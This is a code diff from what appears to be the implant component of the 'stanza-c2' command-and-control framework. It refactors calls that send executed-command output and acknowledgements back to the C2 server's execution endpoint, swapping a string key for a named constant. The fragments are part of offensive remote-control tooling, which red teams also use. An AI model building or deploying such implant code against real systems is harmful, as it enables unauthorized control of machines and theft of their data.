@@ -14,6 +14,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/jmpsec/stanza-c2/pkg/callbacks"
 	"github.com/jmpsec/stanza-c2/pkg/types"
 )
 
@@ -174,7 +175,7 @@ func commandCollectDone(c chan string, callback types.StzCallback, cmdID uint) {
 			ID:     cmdID,
 			Data:   cmdOutput,
 		}
-		err := sendHTTPExecution(callback.Endpoints["execution"], confirm)
+		err := sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 		if err != nil && !_silence {
 			log.Println(err)
 		}
@@ -223,7 +224,7 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 			ID:     data.ID,
 			Data:   "",
 		}
-		err := sendHTTPExecution(callback.Endpoints["execution"], confirm)
+		err := sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 		if err != nil && !_silence {
 			log.Println(err)
 		}
@@ -259,7 +260,7 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 					ID:     data.ID,
 					Data:   "",
 				}
-				err = sendHTTPExecution(callback.Endpoints["execution"], confirm)
+				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 				if err != nil && !_silence {
 					log.Println(err)
 				}
@@ -315,7 +316,7 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 					ID:     data.ID,
 					Data:   txtData,
 				}
-				err = sendHTTPExecution(callback.Endpoints["execution"], confirm)
+				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 				if err != nil && !_silence {
 					log.Println(err)
 				}
@@ -332,7 +333,7 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 					ID:     data.ID,
 					Data:   "",
 				}
-				err = sendHTTPExecution(callback.Endpoints["execution"], confirm)
+				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 				if err != nil && !_silence {
 					log.Println(err)
 				}
@@ -353,7 +354,7 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 					ID:     data.ID,
 					Data:   "",
 				}
-				err = sendHTTPExecution(callback.Endpoints["execution"], confirm)
+				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 				if err != nil && !_silence {
 					log.Println(err)
 				}
@@ -365,7 +366,7 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 					ID:     data.ID,
 					Data:   "",
 				}
-				err = sendHTTPExecution(callback.Endpoints["execution"], confirm)
+				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 				if err != nil && !_silence {
 					log.Println(err)
 				}
